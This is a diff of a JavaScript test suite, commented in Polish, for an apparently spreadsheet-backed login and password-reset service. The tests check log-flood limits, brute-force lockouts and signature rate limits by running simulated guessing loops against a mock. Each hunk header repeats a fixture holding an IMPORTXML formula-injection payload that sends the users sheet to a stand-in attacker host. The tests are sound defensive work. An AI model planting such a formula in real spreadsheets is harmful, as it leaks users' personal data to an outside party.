@@ -101,12 +101,13 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
 /* ---- 5. limit dzienników ---- */
 {
   const B = swiezy({ ustaw: 'WPISOW_NA_GODZINE = 50; WAZNYCH_NA_KOD = 20; WAZNYCH_NA_GODZINE = 30;' });
-  for (let i = 0; i < 400; i++) B.post({ akcja: 'logowanie', kod: '55555', haslo: 'x' + i });      // nieznany kod: po 8 próbach każda zostawia „logowanie_odrzucone”
+  for (let i = 0; i < 400; i++) B.post({ akcja: 'zmien_haslo', kod: '33333', stare_haslo: 'zle' + i, nowe_haslo: 'abcdefgh' });      // istniejące konto: odmowy zostawiają wpisy (zwykła pula po przydziale „konto”)
+  for (let i = 0; i < 400; i++) B.post({ akcja: 'logowanie', kod: '55555', haslo: 'x' + i });      // nieznany kod: wspólny licznik, jeden wpis o zgadywaniu
   const wpisow = B.get('Log').getLastRow() - 1;
   ok('dziennik ma limit wpisów na godzinę (400 odrzuconych logowań → nie więcej niż limit)', wpisow > 0 && wpisow <= 50, 'wpisów: ' + wpisow);
   for (let i = 0; i < 400; i++) B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' });
   const sesji = B.get('Sesje').getLastRow() - 1;
-  ok('wpisy po uwierzytelnieniu (rejestr sesji) mają osobny przydział, ale z limitem na kod (400 → 20)', sesji === 20, 'wpisów: ' + sesji);
+  ok('wpisy po uwierzytelnieniu (rejestr sesji) mają osobny przydział z limitem na kod (400 → 20), potem tylko resztka wspólnej puli', sesji >= 20 && sesji <= 20 + 50, 'wpisów: ' + sesji + ', w Log: ' + wpisow);
   const L0 = B.get('Log').getLastRow();
   B.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }); B.post({ akcja: 'zmien_haslo', kod: '33333', stare_haslo: '700800900', nowe_haslo: 'noweHaslo9' }); B.post({ akcja: 'logowanie', kod: '33333', haslo: 'noweHaslo9' });
   ok('po zalewie dzienników udany reset, zmiana hasła i logowanie innego konta dalej są w Log', B.get('Log').w.slice(L0).map(r => r[2] + ':' + r[3]).join() === 'reset_hasla:OK,zmiana_hasla:OK (telefonem),logowanie_www:OK (haslo)', JSON.stringify(B.get('Log').w.slice(L0).map(r => r.slice(1, 4))));
@@ -120,14 +121,24 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   const L0 = B.get('Log').getLastRow();
   for (let i = 0; i < 3001; i++) B.post({ akcja: 'reset_hasla', kod: 'x' + i, telefon: '1' });
   for (let i = 0; i < 3000; i++) B.post({ akcja: 'haslo_paczki', kod: '99999' }, { bezPodpisu: true });
-  ok('6000 śmieciowych zapytań (zły format kodu, odmowy hasła paczki) zostawia po jednym wpisie na godzinę', B.get('Log').getLastRow() - L0 === 2, 'wpisów: ' + (B.get('Log').getLastRow() - L0));
-  for (let i = 0; i < 3100; i++) B.post({ akcja: 'logowanie', kod: '55555', haslo: 'x' + i });      // wspólna pula wyczerpana
+  for (let i = 0; i < 3001; i++) B.post({ akcja: 'haslo_paczki', kod: String(40000 + i) }, { bezPodpisu: true });      // za każdym razem inny kod
+  for (let i = 0; i < 3010; i++) B.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600000000' });      // przekroczony limit resetu jednego kodu
+  const wpisy = B.get('Log').w.slice(L0).map(r => r[2] + ' ' + r[3]);
+  ok('9000 śmieciowych zapytań (zły format kodu, odmowy hasła paczki z różnymi kodami, reset ponad limit) zostawia najwyżej 20 wpisów na zdarzenie na godzinę', wpisy.length <= 70 && wpisy.filter(w => /za duzo prob/.test(w)).length <= 20, 'wpisów: ' + wpisy.length);
+  ok('…a odmowy dotyczące istniejącego konta (zły telefon w resecie) zostają w Log', wpisy.filter(w => /zly telefon/.test(w)).length === 5, String(wpisy.filter(w => /zly telefon/.test(w)).length));
+  B.dalej(3601 * 1000);
+  for (let i = 0; i < 3100; i++) B.post({ akcja: 'logowanie', kod: '12345', haslo: 'x' + i });      // wspólna pula wyczerpana (zalew odmów)
+  for (let i = 0; i < 3100; i++) B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '111111111', nowe_haslo: 'abcdefgh' });
+  B.dalej(16 * 60 * 1000); for (const k of ['lg:k:12345', 'lg:d:12345']) B.pamiec.delete(k);
   const L1 = B.get('Log').getLastRow();
   const odp = [B.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' }), B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: '600100200', nowe_haslo: 'Nowe-haslo-1' }), B.post({ akcja: 'logowanie', kod: '12345', haslo: 'Nowe-haslo-1' }), B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'Nowe-haslo-1' })];
   const nowe = B.get('Log').w.slice(L1).map(r => r[2]);
   ok('przy wyczerpanej wspólnej puli reset, zmiana hasła, logowanie i wydanie hasła paczki zostawiają ślad', odp.every(o => o.status === 'ok') && nowe.join() === 'reset_hasla,zmiana_hasla,logowanie_www,haslo_paczki', JSON.stringify(nowe));
   B.dalej(3601 * 1000); const L2 = B.get('Log').getLastRow(); B.post({ akcja: 'reset_hasla', kod: 'x', telefon: '1' });
-  ok('po godzinie zagregowane zdarzenie znów zostawia (jeden) wpis', B.get('Log').getLastRow() === L2 + 1);
+  ok('po godzinie zagregowane zdarzenie znów zostawia wpis', B.get('Log').getLastRow() === L2 + 1);
+  const ileKluczy = () => B.pamiec.size, K0 = ileKluczy();
+  for (let i = 0; i < 2000; i++) { B.post({ akcja: 'logowanie', kod: String(60000 + i), haslo: 'cokolwiek1' }); B.post({ akcja: 'reset_hasla', kod: String(70000 + i), telefon: '600000000' }); B.post({ akcja: 'zmien_haslo', kod: String(80000 + i), stare_haslo: 'x', nowe_haslo: 'abcdefgh' }); }
+  ok('6000 zapytań na nieistniejące kody nie zakłada w pamięci podręcznej kluczy na kod (liczniki prawdziwych kont nie wypadają przy przepełnieniu)', ileKluczy() - K0 <= 10, 'nowych kluczy: ' + (ileKluczy() - K0));
 }
 /* ---- 6. podpis ---- */
 {
@@ -228,10 +239,10 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   const B = swiezy(); let trafien = 0;
   B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
   const wpisyLog = () => B.get('Log').getLastRow();
-  for (let i = 0; i < 59; i++) if (B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'kandydat' + i }).pelne) trafien++;
-  ok('59 złych podpisów hasłem (np. stare hasło na drugim urządzeniu) — dobry podpis dalej przechodzi', trafien === 0 && B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+  for (let i = 0; i < 149; i++) if (B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'kandydat' + i }).pelne) trafien++;
+  ok('149 złych podpisów hasłem (np. karta ze starym hasłem pulsująca co 5 min przez dzień pracy) — dobry podpis dalej przechodzi', trafien === 0 && B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
   const logPrzed = wpisyLog();
-  for (let i = 0; i < 140; i++) B.post({ akcja: i % 2 ? 'puls' : 'haslo_paczki', kod: '12345' }, { haslo: 'kandydat-b' + i });
+  for (let i = 0; i < 300; i++) B.post({ akcja: i % 2 ? 'puls' : 'haslo_paczki', kod: '12345' }, { haslo: 'kandydat-b' + i });
   const p = B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' });
   ok('po przekroczeniu limitu złych podpisów nawet trafione hasło nie daje „pelne” (wyrocznia zamknięta)', p.pelne === false && p.imie === '' && p.status === 'ok', JSON.stringify(p));
   ok('…haslo_paczki też odmawia (hasło paczki nie wychodzi)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }); return r.status === 'odmowa' && !('haslo' in r); })());
@@ -243,7 +254,7 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   const C = swiezy();
   for (let i = 0; i < 80; i++) C.post({ akcja: 'puls', kod: '12345' });
   ok('puls bez podpisu hasłem (stary program) nie zużywa limitu', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
-  for (let i = 0; i < 70; i++) C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'zle' + i });
+  for (let i = 0; i < 160; i++) C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'zle' + i });
   C.dalej(6 * 3600 * 1000 + 1000);
   ok('po 6 godzinach (koniec okna) dobry podpis znów przechodzi bez logowania', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
 }
@@ -269,7 +280,7 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
 {
   const B = swiezy();
   for (let i = 0; i < 9; i++) B.post({ akcja: 'logowanie', kod: '12345', haslo: 'zle' + i });
-  for (let i = 0; i < 61; i++) B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'zle' + i });
+  for (let i = 0; i < 151; i++) B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'zle' + i });
   for (let i = 0; i < 31; i++) B.post({ akcja: 'reset_hasla', kod: String(20000 + i), telefon: '1' });
   const przed = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status, B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne];
   B.wywolaj('odblokujKonta()');
